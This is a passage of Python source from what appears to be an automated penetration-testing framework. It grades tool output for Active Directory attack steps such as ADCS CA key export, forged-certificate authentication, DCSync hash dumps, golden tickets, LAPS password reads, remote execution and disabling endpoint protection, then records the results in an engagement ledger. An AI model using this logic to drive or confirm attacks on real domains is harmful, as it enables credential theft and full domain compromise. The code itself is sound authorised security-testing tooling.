    if not isinstance(probe_result, dict):
        return CapabilityVerification("failed", "probe result is not structured")
    if probe_result.get("pfx_sha256_mismatch") is True:
        return CapabilityVerification("blocked", "pfx sha256 mismatch", _selected_probe(probe_result))

    callback_id = _input_text(probe_result, "callback_id", "callback", "callback_display_id")
    target_host = _normalize(_input_text(probe_result, "target_host", "host", "computer", "target"))
    target_domain = _normalize(_input_text(probe_result, "target_domain", "domain", "realm"))
    material_present = _any_true(
        probe_result,
        (
            "ca_private_key_material_present",
            "pfx_blob_valid",
            "private_key_pem_present",
        ),
    )
    cert_identified = _any_true(probe_result, ("ca_certificate_identified", "ca_thumbprint_present", "ca_subject_present"))
    export_completed = _any_true(probe_result, ("ca_export_completed", "export_marker_seen"))
    if material_present and cert_identified and export_completed and callback_id and target_host and target_domain:
        return CapabilityVerification(
            "achieved",
            "ADCS CA private-key PFX material verified",
            _selected_probe(probe_result),
        )
    if material_present and cert_identified:
        return CapabilityVerification(
            "partial",
            "CA private-key material is present, but callback/target/export proof is incomplete",
            _selected_probe(probe_result),
        )

    blocker = _first_true(
        probe_result,
        (
            "no_ca_certificate",
            "key_not_exportable",
            "tool_execution_failed",
            "pfx_export_failed",
            "access_denied",
            "logon_failure",
            "network_path_not_found",
            "output_not_found",
            "wmi_unavailable",
            "rpc_unavailable",
            "callback_dead",
        ),
    )
    if blocker:
        return CapabilityVerification("blocked", blocker.replace("_", " "), _selected_probe(probe_result))

    if _any_true(probe_result, ("ca_certificate_identified", "remote_process_created", "metadata_file_present")):
        return CapabilityVerification(
            "partial",
            "CA export was attempted or metadata was found, but no usable PFX/private-key material was verified",
            _selected_probe(probe_result),
        )
    return CapabilityVerification("failed", "no ADCS CA private-key evidence", _selected_probe(probe_result))


def verify_adcs_esc_certificate_enroll(probe_result: dict[str, Any]) -> CapabilityVerification:
    """Classify proof that ADCS enrollment produced a usable account certificate artifact."""
    if not isinstance(probe_result, dict):
        return CapabilityVerification("failed", "probe result is not structured")

    callback_id = _input_text(probe_result, "callback_id", "callback", "callback_display_id")
    account = _normalize(_input_text(probe_result, "account", "user", "principal", "target_account"))
    domain = _normalize(_input_text(probe_result, "domain", "realm", "target_domain"))
    material_present = _any_true(
        probe_result,
        (
            "enrolled_certificate_material_present",
            "pfx_blob_valid",
            "certificate_pem_present",
        ),
    )
    private_key_present = _any_true(
        probe_result,
        (
            "enrolled_certificate_private_key_present",
            "private_key_pem_present",
            "pfx_blob_valid",
        ),
    )
    enrollment_completed = _any_true(
        probe_result,
        (
            "certificate_enrollment_completed",
            "certificate_request_issued",
            "enroll_marker_seen",
        ),
    )
    if material_present and private_key_present and enrollment_completed and callback_id and account and domain:
        return CapabilityVerification(
            "achieved",
            "ADCS enrollment produced account certificate material",
            _selected_probe(probe_result),
        )
    if material_present and private_key_present:
        return CapabilityVerification(
            "partial",
            "account certificate material is present, but callback/account/domain/enrollment proof is incomplete",
            _selected_probe(probe_result),
        )

    blocker = _first_true(
        probe_result,
        (
            "certificate_request_denied",
            "template_not_found",
            "ca_unreachable",
            "enrollment_context_missing",
            "tool_execution_failed",
            "access_denied",
            "logon_failure",
            "callback_dead",
        ),
    )
    if blocker:
        return CapabilityVerification("blocked", blocker.replace("_", " "), _selected_probe(probe_result))

    if _any_true(probe_result, ("certificate_request_submitted", "template_found", "ca_reachable")):
        return CapabilityVerification(
            "partial",
            "certificate enrollment was attempted, but no usable certificate/private key material was verified",
            _selected_probe(probe_result),
        )
    return CapabilityVerification("failed", "no ADCS enrollment certificate evidence", _selected_probe(probe_result))


def verify_adcs_certificate_auth(probe_result: dict[str, Any]) -> CapabilityVerification:
    """Classify proof that a forged ADCS certificate produced usable account access."""
    if not isinstance(probe_result, dict):
        return CapabilityVerification("failed", "probe result is not structured")

    callback_id = _input_text(probe_result, "callback_id", "callback", "callback_display_id")
    account = _normalize(_input_text(probe_result, "account", "user", "principal", "target_account"))
    domain = _normalize(_input_text(probe_result, "domain", "realm", "target_domain"))
    auth_specific = _adcs_certificate_auth_specific_signal(probe_result)
    access_signal = _any_true(
        probe_result,
        (
            "service_access_proven",
            "domain_admin",
            "schannel_ldap_bind",
            "ntlm_hash_present",
        ),
    )
    access_proven = auth_specific and access_signal
    if access_proven and callback_id and account and domain:
        return CapabilityVerification(
            "achieved",
            "ADCS certificate authentication proved usable access",
            _selected_probe(probe_result),
        )
    if access_proven:
        return CapabilityVerification(
            "partial",
            "certificate-auth access was proven, but callback/account/domain identity is incomplete",
            _selected_probe(probe_result),
        )
    if access_signal and not auth_specific:
        return CapabilityVerification(
            "partial",
            "service access was proven, but no certificate-auth-specific proof was present",
            _selected_probe(probe_result),
        )

    blocker = _first_true(
        probe_result,
        (
            "ca_pfx_missing",
            "certificate_forge_failed",
            "forged_certificate_missing",
            "pkinit_not_supported",
            "pkinit_failed",
            "kdc_rejected",
            "bad_certificate",
            "ticket_injection_failed",
            "logon_context_failed",
            "access_denied",
            "callback_dead",
        ),
    )
    if blocker:
        return CapabilityVerification("blocked", blocker.replace("_", " "), _selected_probe(probe_result))

    if _any_true(
        probe_result,
        (
            "certificate_forged",
            "forged_certificate_present",
            "pkinit_tgt_present",
            "schannel_ldap_bind",
            "tgt_present",
            "ticket_imported",
            "ticket_context_created",
            "ntlm_hash_present",
            "auth_marker_seen",
        ),
    ):
        return CapabilityVerification(
            "partial",
            "certificate was forged or PKINIT was staged, but usable service access is not verified",
            _selected_probe(probe_result),
        )
    return CapabilityVerification("failed", "no ADCS certificate-auth evidence", _selected_probe(probe_result))


def _adcs_certificate_auth_specific_signal(probe_result: dict[str, Any]) -> bool:
    method = _normalize(_input_text(probe_result, "certificate_auth_method", "auth_method"))
    status = _normalize(_input_text(probe_result, "certificate_auth_status", "auth_status"))
    if method in {"pkinit", "schannel-ldap", "schannel_ldap", "certipy", "cert-auth", "certificate-auth"}:
        return True
    if status == "ok":
        return True
    return _any_true(
        probe_result,
        (
            "pkinit_tgt_present",
            "schannel_ldap_bind",
            "ntlm_hash_present",
        ),
    )


def verify_endpoint_protection_adjustment(probe_result: dict[str, Any]) -> CapabilityVerification:
    """Classify proof that endpoint protection was relaxed or already inactive."""
    if not isinstance(probe_result, dict):
        return CapabilityVerification("failed", "probe result is not structured")

    callback_id = _input_text(probe_result, "callback_id", "callback", "callback_display_id")
    target_host = _normalize(_input_text(probe_result, "target_host", "host", "computer", "target"))
    target_domain = _normalize(_input_text(probe_result, "target_domain", "domain", "realm"))
    marker_or_status = _any_true(probe_result, ("adjustment_marker_seen", "endpoint_status_read"))
    adjusted = _any_true(
        probe_result,
        (
            "endpoint_adjustment_proven",
            "realtime_disabled_after",
            "requested_exclusion_present",
            "endpoint_inactive",
        ),
    )
    if adjusted and marker_or_status and callback_id and target_host and target_domain:
        return CapabilityVerification(
            "achieved",
            "endpoint protection adjustment verified",
            _selected_probe(probe_result),
        )

    blocker = _first_true(
        probe_result,
        (
            "tamper_protected",
            "set_preference_failed",
            "access_denied",
            "not_admin",
            "cmdlet_missing",
            "logon_failure",
            "network_path_not_found",
            "output_not_found",
            "wmi_unavailable",
            "rpc_unavailable",
            "callback_dead",
        ),
    )
    if blocker:
        return CapabilityVerification("blocked", blocker.replace("_", " "), _selected_probe(probe_result))

    if _any_true(probe_result, ("endpoint_status_read", "realtime_disabled_before", "exclusion_present_before")):
        return CapabilityVerification(
            "partial",
            "endpoint protection status was read, but requested adjustment was not proven",
            _selected_probe(probe_result),
        )
    return CapabilityVerification("failed", "no endpoint protection adjustment evidence", _selected_probe(probe_result))


def verify_capability(name: str, probe_result: dict[str, Any]) -> CapabilityVerification:
    """Dispatch a structured probe to the verifier for a capability name."""
    normalized = _normalize(name)
    if normalized == "gpo-controlled-system-exec":
        return verify_gpo_controlled_system_exec(probe_result)
    if normalized == "grant-directory-rights":
        return verify_grant_directory_rights(probe_result)
    if normalized in {"dcsync", "dcsync-krbtgt", "dcsync-account"}:
        return verify_dcsync_secret(probe_result)
    if normalized == "forge-golden-ticket":
        return verify_forged_ticket(probe_result)
    if normalized == "ensure-kerberos-context":
        return verify_kerberos_context(probe_result)
    if normalized == "ensure-account-kerberos-context":
        return verify_account_kerberos_context(probe_result)
    if normalized == "read-managed-local-admin-secret":
        return verify_managed_local_admin_secret(probe_result)
    if normalized == "use-managed-local-admin-secret":
        return verify_local_admin_access(probe_result)
    if normalized == "execute-as-local-admin":
        return verify_remote_execution(probe_result)
    if normalized == "endpoint-protection-adjustment":
        return verify_endpoint_protection_adjustment(probe_result)
    if normalized == "adcs-ca-private-key-export":
        return verify_adcs_ca_private_key_export(probe_result)
    if normalized == "adcs-esc-certificate-enroll":
        return verify_adcs_esc_certificate_enroll(probe_result)
    if normalized == "adcs-certificate-auth":
        return verify_adcs_certificate_auth(probe_result)
    probe = probe_result if isinstance(probe_result, dict) else {}
    return CapabilityVerification("failed", f"unknown capability: {name}", _selected_probe(probe))


def _ensure_context_admin_effect(action: CapabilityAction, probe_result: dict[str, Any] | None = None) -> str:
    """Return the target-domain admin co-effect for a verified cross-domain Kerberos context."""
    if _normalize(getattr(action, "name", "")) != "ensure-kerberos-context":
        return ""
    intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
    fields = _target_fields(getattr(action, "target", ""))
    probe = probe_result if isinstance(probe_result, dict) else {}
    target_domain = _normalize(
        _input_text(probe, "target_domain", "domain", "realm")
        or intent.get("target_domain")
        or intent.get("effect_domain")
        or intent.get("domain")
        or fields.get("target_domain")
        or fields.get("domain")
    )
    source_domain = _normalize(
        _input_text(probe, "source_domain")
        or intent.get("source_domain")
        or fields.get("source_domain")
        or target_domain
    )
    if not target_domain or not source_domain or source_domain == target_domain:
        return ""
    return f"da:{target_domain}"


def record_capability_result(
    state: Any,
    action: CapabilityAction,
    probe_result: dict[str, Any],
    now: str,
    evidence: dict[str, Any] | None = None,
    *,
    proof_envelope: dict[str, Any] | None = None,
) -> tuple[Any, CapabilityVerification]:
    """Record a capability verifier result into an EngagementState-shaped ledger.

    The effect is durable only when the capability verifier returns ``achieved``.
    Partial outcomes are recorded as failed attempts with the partial verdict in
    evidence; this keeps ``achieved_effects`` strict while preserving debugging
    context for repair.
    """
    verification_probe = dict(probe_result) if isinstance(probe_result, dict) else probe_result
    if isinstance(verification_probe, dict) and isinstance(evidence, dict):
        for key in ("callback_id", "callback", "callback_display_id"):
            if key in evidence and not _input_text(verification_probe, key):
                verification_probe[key] = evidence[key]
    verification = verify_capability(action.name, verification_probe)
    status = _record_status_from_verdict(verification.verdict)
    effect = action.effects[0] if action.effects else f"{action.name}:{action.target}"
    base_evidence: dict[str, Any] = {
        "source": "capability_verifier",
        "provenance": "run",
        "capability": action.name,
        "capability_target": action.target,
        "verify_verdict": verification.verdict,
        "verify_reason": verification.reason,
        "artifact_present": verification.verdict == "achieved",
        "probe": dict(verification.evidence),
    }
    try:
        try:
            from . import proof_boundary
        except ImportError:
            import proof_boundary
        evidence_dict = proof_boundary.merge_untrusted_evidence(base_evidence, evidence)
    except Exception:
        evidence_dict = dict(base_evidence)
        if isinstance(evidence, dict):
            for key, value in evidence.items():
                if key not in {
                    "proof_envelope",
                    "proof_persistence_state",
                    "proof_admission_reason",
                    "proof_hash",
                    "origin",
                    "scope",
                    "engagement_id",
                    "callback_id",
                    "transaction_id",
                    "mythic_task_id",
                    "task_id",
                    "terminal_task_status",
                    "terminal_status",
                    "command",
                    "artifact_id",
                    "artifact_sha256",
                    "bloodhound_job_id",
                    "ingest_job_id",
                    "ingest_status",
                    "source_artifact_id",
                    "source_artifact_sha256",
                    "verifier_id",
                    "verifier_version",
                    "verifier_hash",
                    "captured_at",
                    "persistence_state",
                }:
                    evidence_dict[key] = value

    satisfied_effects = list(action.effects)
    if status == "achieved":
        admin_effect = _ensure_context_admin_effect(
            action,
            verification_probe if isinstance(verification_probe, dict) else {},
        )
        if admin_effect and admin_effect not in satisfied_effects:
            satisfied_effects.insert(0, admin_effect)
        credential_effect = _certificate_auth_credential_effect(
            action,
            verification_probe if isinstance(verification_probe, dict) else {},
        )
        if credential_effect and credential_effect not in satisfied_effects:
            satisfied_effects.append(credential_effect)
        proves_callback_context = _probe_proves_callback_kerberos_context(
            action,
            verification_probe if isinstance(verification_probe, dict) else {},
        )
        callback_id = _normalize_callback_id(
            _input_text(verification_probe if isinstance(verification_probe, dict) else {}, "callback_id", "callback", "callback_display_id")
        )
        if callback_id and proves_callback_context:
            for action_effect in list(satisfied_effects):
                prefix, _, domain = _normalize(action_effect).partition(":")
                if prefix in {"da", "ea"} and domain:
                    context_effect = _kerberos_context_effect(domain, callback_id)
                    if context_effect not in satisfied_effects:
                        satisfied_effects.append(context_effect)

    try:
        try:
            from . import engagement_state
        except ImportError:
            import engagement_state
        updated = engagement_state.record_effect_result(
            state,
            f"capability:{action.name}",
            action.target,
            effect,
            status,
            evidence_dict,
            now,
            preconditions=list(action.preconditions),
            satisfied_effects=satisfied_effects,
            proof_envelope=proof_envelope,
        )
    except Exception:
        updated = state
    return updated, verification


def _probe_proves_callback_kerberos_context(action: CapabilityAction, probe_result: dict[str, Any]) -> bool:
    """Return true only for evidence that a callback holds a usable Kerberos context."""
    if not isinstance(probe_result, dict):
        return False
    capability = _normalize(getattr(action, "name", ""))
    service_access = _any_true(probe_result, ("service_access_proven", "ticket_valid", "ldap_access_proven"))
    staged_ticket = _any_true(
        probe_result,
        (
            "ticket_imported",
            "ticket_context_created",
            "account_ticket_present",
            "ticket_forged",
            "tgt_present",
            "pkinit_tgt_present",
            "ptt_attempted",
        ),
    )
    if capability == "adcs-certificate-auth":
        # PKINIT/U2U can return reusable credential material without importing a ticket into the
        # callback context. Schannel LDAP also proves certificate auth without creating a Kerberos context.
        return bool(service_access and staged_ticket)
    if capability == "ensure-account-kerberos-context":
        return bool(
            service_access
            and _any_true(
                probe_result,
                ("account_ticket_present", "ticket_client_matches_account", "expected_account_ticket_present"),
            )
            and _any_true(probe_result, ("logon_context_proven", "account_context_proven"))
        )
    if capability in {"ensure-kerberos-context", "forge-golden-ticket"}:
        return bool(service_access)
    return False


def _certificate_auth_credential_effect(action: CapabilityAction, probe_result: dict[str, Any]) -> str:
    """Return a reusable credential-material effect for certificate auth that disclosed a secret."""
    if _normalize(getattr(action, "name", "")) != "adcs-certificate-auth":
        return ""
    if not _any_true(probe_result, ("ntlm_hash_present", "aes256_hash_present", "aes128_hash_present")):
        return ""
    fields = _target_fields(getattr(action, "target", ""))
    intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
    account = _normalize(
        _input_text(probe_result, "account", "user", "principal", "target_account")
        or intent.get("account")
        or intent.get("user")
        or fields.get("account")
        or fields.get("user")
        or fields.get("principal")
    )
    domain = _normalize(
        _input_text(probe_result, "domain", "realm", "target_domain")
        or intent.get("domain")
        or intent.get("target_domain")
        or fields.get("domain")
        or fields.get("target_domain")
    )
    if not account or not domain:
        return ""
    return f"creds:{account}@{domain}"


def validate_structured_artifacts(output: Any) -> dict[str, Any]:
    """Validate structured artifacts found in command output.

    This stays generic on purpose. If a setup command emits or reads back a
    structured artifact, the artifact has to be syntactically valid before an
    executor treats the setup as usable progress.
    """

    text = _text(output)
    xml_text = _extract_first_xml_document(text)
    if not xml_text:
        return {"structured_artifact_observed": False}
    try:
        ET.fromstring(xml_text)
    except ET.ParseError as exc:
        return {
            "structured_artifact_observed": True,
            "artifact_type": "xml",
            "artifact_valid": False,
            "xml_observed": True,
            "xml_valid": False,
            "xml_parse_error": str(exc),
        }
    return {
        "structured_artifact_observed": True,
        "artifact_type": "xml",
        "artifact_valid": True,
        "xml_observed": True,
        "xml_valid": True,
    }


def _extract_first_xml_document(text: str) -> str:
    if not text:
        return ""
    declaration_start = text.find("<?xml")
    element_match = re.search(r"<([A-Za-z_][\w:.-]*)\b", text)
    element_start = element_match.start() if element_match else -1
    starts = [idx for idx in (declaration_start, element_start) if idx >= 0]
    if not starts:
        return ""
    start = min(starts)
    candidate = text[start:].strip()
    root_match = re.match(r"(?:<\?xml[^>]*>\s*)?<([A-Za-z_][\w:.-]*)\b", candidate, re.IGNORECASE)
    if not root_match:
        return ""
    root = root_match.group(1)
    close = re.search(rf"</{re.escape(root)}\s*>", candidate, re.IGNORECASE)
    if close:
        remainder = candidate[close.end():].strip()
        if re.search(r"<(?:\?xml|[A-Za-z_][\w:.-]*\b)", remainder):
            return candidate
        return candidate[:close.end()]
    return candidate


def extract_gpo_system_exec_probe(
    output: Any = None,
    callback: dict[str, Any] | None = None,
    task: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Build the structured probe for GPO-controlled SYSTEM execution.

    The inputs are already-observed live data: task output, callback metadata, or
    task metadata. This function performs no network calls.
    """
    text = _text(output)
    low = text.casefold()
    callback = callback if isinstance(callback, dict) else {}
    task = task if isinstance(task, dict) else {}

    callback_system = _metadata_has_system_identity(callback)
    output_system = bool(_SYSTEM_IDENTITY_RE.search(low))
    command_succeeded = output_system or task.get("system_command_succeeded") is True
    artifact_probe = validate_structured_artifacts(text)
    xml_observed = artifact_probe.get("xml_observed") is True
    xml_valid = artifact_probe.get("xml_valid")
    probe = {
        "system_callback_observed": callback_system,
        "system_command_succeeded": command_succeeded,
        "proof_not_found": _has_any(
            low,
            (
                "file not found",
                "cannot find the file",
                "path not found",
                "could not find file",
                "does not exist",
            ),
        ) and not output_system,
        "scheduled_task_xml_valid": (
            bool(xml_valid) if xml_observed else _has_any(
                low,
                (
                    "scheduled task xml valid",
                    "<task",
                    "task xml present",
                    "scheduledtasks.xml",
                    "immediate task",
                    "immediate scheduled task",
                    "gpo was modified",
                ),
            )
        ),
        "structured_artifact_observed": artifact_probe.get("structured_artifact_observed") is True,
        "artifact_type": artifact_probe.get("artifact_type", ""),
        "artifact_valid": artifact_probe.get("artifact_valid"),
        "xml_observed": xml_observed,
        "xml_valid": xml_valid,
        "xml_invalid": xml_observed and xml_valid is False,
        "xml_parse_error": artifact_probe.get("xml_parse_error", ""),
        "gpt_ini_version_bumped": _has_all(low, ("gpt.ini", "version")),
        "ldap_version_bumped": _has_all(low, ("ldap", "version"))
        or _has_any(low, ("versionnumber attribute changed", "version number attribute changed")),
        "command_path_present": _has_any(low, ("command path present", "payload path present", "file exists")),
        "gpupdate_completed": _has_any(low, ("gpupdate completed", "policy update completed", "computer policy update")),
        "cse_extension_registered": _has_any(low, ("cse extension", "scheduled tasks extension")),
        "defender_blocked": _has_any(low, ("defender", "quarantined", "malware", "blocked by")),
        "payload_quarantined": _has_any(low, ("quarantined", "threat removed")),
        "xml_empty": _has_any(low, ("xml empty", "0 bytes", "empty xml")),
        "xml_save_locked": _has_any(low, ("being used by another process", "sharing violation", "locked")),
        "gpupdate_failed": _has_any(low, ("gpupdate failed", "policy update failed")),
        "command_path_missing": _has_any(low, ("path not found", "file not found", "command path missing")),
    }
    return probe


def extract_directory_rights_probe(
    output: Any = None,
    graph_facts: list[Any] | None = None,
    acl_entries: list[Any] | None = None,
    domain: str = "",
) -> dict[str, Any]:
    """Build the structured probe for a replication-rights grant.

    Free-form tool output, BloodHound graph facts, and ACL enumeration rows are
    all accepted as observed evidence. Any one authoritative ACL source can prove
    the effect.
    """
    try:
        try:
            from . import credential_artifacts
        except ImportError:
            import credential_artifacts
        probe = dict(credential_artifacts.extract_grant_probe(output))
    except Exception:
        probe = {
            "ds_replication_rights": False,
            "ace_present": False,
            "get_changes": False,
            "get_changes_all": False,
            "get_changes_in_filtered_set": False,
        }

    target_domain = _normalize(domain)
    for fact in graph_facts or []:
        predicate = _normalize(getattr(fact, "predicate", fact))
        if not predicate:
            continue
        if predicate.startswith("ds-replication-rights:"):
            fact_domain = predicate[len("ds-replication-rights:"):]
            if not target_domain or fact_domain == target_domain:
                probe["ds_replication_rights"] = True
                probe["ace_present"] = True

    acl_text = "\n".join(_text(item) for item in (acl_entries or []))
    rights_probe = _replication_right_probe_from_text(acl_text)
    for key, value in rights_probe.items():
        probe[key] = bool(probe.get(key) or value)
    if probe.get("get_changes") and probe.get("get_changes_all"):
        probe["ds_replication_rights"] = True
        probe["ace_present"] = True
    return probe


def extract_dcsync_secret_probe(output: Any = None) -> dict[str, Any]:
    """Build the structured probe for DCSync output."""
    try:
        try:
            from . import credential_artifacts
        except ImportError:
            import credential_artifacts
        probe = dict(credential_artifacts.extract_credential_probe(output))
    except Exception:
        probe = {
            "credentials_dumped": False,
            "krbtgt_hash_present": False,
            "user_hash_present": False,
            "domain_hashes_dumped": False,
            "secretsdump_connected": False,
        }
    low = _text(output).casefold()
    probe["dcsync_started"] = bool(probe.get("secretsdump_connected")) or _has_any(low, ("dcsync", "drsuapi"))
    probe["replication_access_denied"] = _has_any(
        low,
        ("8453", "replication access was denied", "access denied", "access is denied"),
    )
    probe["access_denied"] = _has_any(low, ("access denied", "access is denied", "0x00000005"))
    probe["bad_dn"] = _has_any(low, ("8439", "ds_dra_bad_dn", "bad dn"))
    probe["principal_not_found"] = _has_any(low, ("no such user", "principal not found", "object not found"))
    probe["target_not_found"] = _has_any(low, ("domain not found", "naming context not found"))
    probe["dc_unreachable"] = _has_any(low, ("dc unreachable", "connection refused", "network path was not found"))
    return probe


def extract_managed_local_admin_secret_probe(
    output: Any = None,
    target_host: str = "",
    target_domain: str = "",
) -> dict[str, Any]:
    """Build a redacted structured probe for managed local admin password reads."""
    text = _task_output_text(output)
    low = text.casefold()
    secret_attr, secret_len = _managed_secret_attribute(text)
    encrypted_present = _attribute_present(text, "mslaps-encryptedpassword")
    metadata_present = any(
        _attribute_present(text, attr)
        for attr in (
            "ms-mcs-admpwdexpirationtime",
            "mslaps-passwordexpirationtime",
            "distinguishedname",
            "dnshostname",
            "samaccountname",
        )
    )
    object_found = bool(secret_attr or encrypted_present or metadata_present) and "no_result" not in low
    probe = {
        "target_host": _normalize(_host_short(target_host)),
        "target_domain": _normalize(target_domain),
        "managed_local_admin_secret_present": bool(secret_attr),
        "legacy_laps_password_present": secret_attr == "ms-mcs-admpwd",
        "windows_laps_password_present": secret_attr == "mslaps-password",
        "secret_attribute": secret_attr,
        "secret_length": secret_len,
        "encrypted_laps_blob_present": encrypted_present,
        "laps_metadata_present": metadata_present,
        "computer_object_found": object_found,
        "directory_query_succeeded": object_found or "properties" in low or "distinguishedname" in low,
        "target_not_found": _has_any(low, ("no_result", "not found", "no such object")),
        "access_denied": _has_any(low, ("access denied", "access is denied", "insufficient access rights", "0x80070005")),
        "ldap_bind_failed": _has_any(low, ("ldap bind failed", "logon failure", "invalid credentials", "stronger authentication")),
        "directory_unreachable": _has_any(low, ("server is not operational", "server unavailable", "network path was not found")),
        "wrong_kerberos_context": _has_any(low, ("kdc_err", "target principal name is incorrect", "no credentials are available")),
    }
    return probe


def extract_local_admin_access_probe(
    output: Any = None,
    target_host: str = "",
    target_domain: str = "",
) -> dict[str, Any]:
    """Build a structured probe for remote local-admin access proof."""
    text = _task_output_text(output)
    low = text.casefold()
    path_text = text.replace("/", "\\").casefold()
    host = _normalize(_host_short(target_host))
    domain = _normalize(target_domain)
    fqdn = _host_fqdn(host, domain)
    candidates = [f"\\\\{host}\\c$"] if host else []
    if fqdn and fqdn != host:
        candidates.append(f"\\\\{fqdn}\\c$")
    compact = re.sub(r"\s+", "", path_text)
    json_host_seen = bool(fqdn) and (
        f'"host":"{fqdn}"' in compact
        or f'"host":"{host}"' in compact
    )
    json_admin_share_seen = (
        '"name":"c$"' in compact
        or '"directory":"c$"' in compact
        or '"full_name":"c$\\\\' in compact
    )
    target_resource_seen = (
        (bool(candidates) and any(candidate in path_text for candidate in candidates))
        or (json_host_seen and json_admin_share_seen)
    )
    explicit_success = _has_any(
        low,
        (
            "admin share access proven",
            "local admin access proven",
            "service_access_proven=true",
            "local_admin_access_proven=true",
        ),
    )
    logon_failure = _has_any(
        low,
        (
            "logon failure",
            "unknown user name or bad password",
            "the user name or password is incorrect",
            "the specified network password is not correct",
            "1326",
        ),
    )
    account_locked = _has_any(
        low,
        (
            "account is currently locked out",
            "referenced account is currently locked out",
            "system error 1909",
            "1909",
        ),
    )
    blocked = (
        _has_any(low, ("access denied", "access is denied", "0x00000005"))
        or logon_failure
        or _has_any(low, ("network path was not found", "0x00000035"))
        or _has_any(low, ("host unreachable", "could not find the network path", "connection timed out"))
    )
    admin_share_listing = (
        ("directory of \\\\" in path_text or "volume in drive \\\\" in path_text)
        and "\\c$" in path_text
    )
    native_listing = target_resource_seen and _has_any(
        low,
        (
            '"success":true',
            "lastwritetime",
            "last write",
            "length",
            "file size",
            "<dir>",
            "directory",
            "listing",
        ),
    )
    access_proven = explicit_success or (not blocked and target_resource_seen and (admin_share_listing or native_listing))
    return {
        "target_host": host,
        "target_domain": domain,
        "local_admin_access_proven": access_proven,
        "admin_share_access_proven": access_proven and ("\\c$" in path_text or json_admin_share_seen),
        "service_access_proven": access_proven,
        "target_resource_seen": target_resource_seen,
        "logon_context_created": _has_any(low, ("make_token", "created token", "netonly", "newcredentials")),
        "credential_accepted": _has_any(low, ("credential accepted", "token created")),
        "access_denied": _has_any(low, ("access denied", "access is denied", "0x00000005")),
        "logon_failure": logon_failure,
        "bad_password": logon_failure,
        "network_path_not_found": _has_any(low, ("network path was not found", "0x00000035")),
        "host_unreachable": _has_any(low, ("host unreachable", "could not find the network path", "connection timed out")),
    }


def extract_remote_execution_probe(
    output: Any = None,
    target_host: str = "",
    target_domain: str = "",
    proof_marker: str = "",
) -> dict[str, Any]:
    """Build a structured probe for target-side remote command execution."""
    text = _task_output_text(output)
    low = text.casefold()
    host = _normalize(_host_short(target_host))
    domain = _normalize(target_domain)
    fqdn = _host_fqdn(host, domain)
    marker = _text(proof_marker).strip()
    marker_seen = bool(marker and marker.casefold() in low)
    generic_marker_seen = "sage_remote_exec_proof" in low
    marker_line_seen = bool(
        (marker and re.search(rf"(?im)^\s*{re.escape(marker)}\s*$", text))
        or re.search(r"(?im)^\s*SAGE_REMOTE_EXEC_PROOF_[A-Za-z0-9_.-]+\s*$", text)
    )
    host_seen = bool(
        (host and re.search(rf"(?<![a-z0-9-]){re.escape(host)}(?![a-z0-9-])", low))
        or (fqdn and fqdn in low)
    )
    host_line_seen = bool(
        (host and re.search(rf"(?im)^\s*{re.escape(host)}\s*$", text))
        or (fqdn and re.search(rf"(?im)^\s*{re.escape(fqdn)}\s*$", text))
    )
    identity_seen = bool(
        re.search(r"(?im)^\s*(?:[a-z0-9_.-]+\\[a-z0-9_.\-$]+|nt authority\\system|system)\s*$", text)
    )
    remote_output_proven = bool(marker_line_seen and (host_line_seen or identity_seen))
    proof_file_read = remote_output_proven
    explicit_success = _has_any(
        low,
        (
            "remote_execution_proven=true",
            "remote command output proven",
            "remote execution proof",
        ),
    )
    remote_process_created = _has_any(
        low,
        (
            "process created",
            "created process",
            "returnvalue = 0",
            "return value = 0",
            "pid:",
            "processid",
            "wmiexecute",
            "remote process started",
        ),
    )
    logon_failure = _has_any(
        low,
        (
            "logon failure",
            "unknown user name or bad password",
            "the user name or password is incorrect",
            "the specified network password is not correct",
            "1326",
        ),
    )
    account_locked = _has_any(
        low,
        (
            "account is currently locked out",
            "referenced account is currently locked out",
            "system error 1909",
            "1909",
        ),
    )
    access_denied = _has_any(low, ("access denied", "access is denied", "0x00000005"))
    proof_not_found = _has_any(
        low,
        (
            "file not found",
            "cannot find the file",
            "path not found",
            "could not find file",
            "does not exist",
        ),
    )
    return {
        "target_host": host,
        "target_domain": domain,
        "remote_execution_proven": bool(proof_file_read or explicit_success),
        "remote_command_output_proven": remote_output_proven,
        "proof_file_read": proof_file_read,
        "proof_marker_line_seen": marker_line_seen,
        "proof_marker_seen": bool(marker_seen or generic_marker_seen),
        "target_host_seen": host_seen,
        "remote_identity_seen": identity_seen,
        "remote_process_created": remote_process_created,
        "credential_accepted": remote_process_created and not (access_denied or logon_failure),
        "proof_file_present": proof_file_read,
        "access_denied": access_denied,
        "account_locked": account_locked,
        "logon_failure": logon_failure,
        "bad_password": logon_failure and not account_locked,
        "wmi_unavailable": _has_any(low, ("invalid namespace", "wbem_e_", "0x800410")),
        "rpc_unavailable": _has_any(low, ("rpc server is unavailable", "0x800706ba")),
        "network_path_not_found": _has_any(low, (
            "network path was not found",
            "network name cannot be found",
            "specified network name is no longer available",
            "0x00000035",
        )),
        "proof_not_found": proof_not_found and not (marker_seen or generic_marker_seen),
        "execution_failed": _has_any(low, ("execution failed", "command failed", "returnvalue = 1", "return value = 1")),
    }


def extract_endpoint_protection_probe(
    output: Any = None,
    target_host: str = "",
    target_domain: str = "",
    proof_marker: str = "",
) -> dict[str, Any]:
    """Build a structured probe for endpoint protection status/adjustment output."""
    text = _task_output_text(output)
    low = text.casefold()
    host = _normalize(_host_short(target_host))
    domain = _normalize(target_domain)
    marker = _text(proof_marker).strip()
    marker_line_seen = bool(
        (marker and re.search(rf"(?im)^\s*{re.escape(marker)}\s*$", text))
        or re.search(r"(?im)^\s*SAGE_EP_ADJUST_PROOF_[A-Za-z0-9_.-]+\s*$", text)
    )
    status = _first_output_field(text, "EP_STATUS").casefold()
    realtime_before = _parse_probe_bool(_first_output_field(text, "EP_REALTIME_BEFORE"))
    realtime_after = _parse_probe_bool(_first_output_field(text, "EP_REALTIME_AFTER"))
    antivirus_enabled = _parse_probe_bool(_first_output_field(text, "EP_ANTIVIRUS_ENABLED"))
    am_service_enabled = _parse_probe_bool(_first_output_field(text, "EP_AMSERVICE_ENABLED"))
    tamper = _parse_probe_bool(_first_output_field(text, "EP_TAMPER_PROTECTED"))
    set_status = _first_output_field(text, "EP_SET_STATUS").casefold()
    exclusion_status = _first_output_field(text, "EP_EXCLUSION_STATUS").casefold()
    exclusion_present = _parse_probe_bool(_first_output_field(text, "EP_EXCLUSION_PRESENT"))
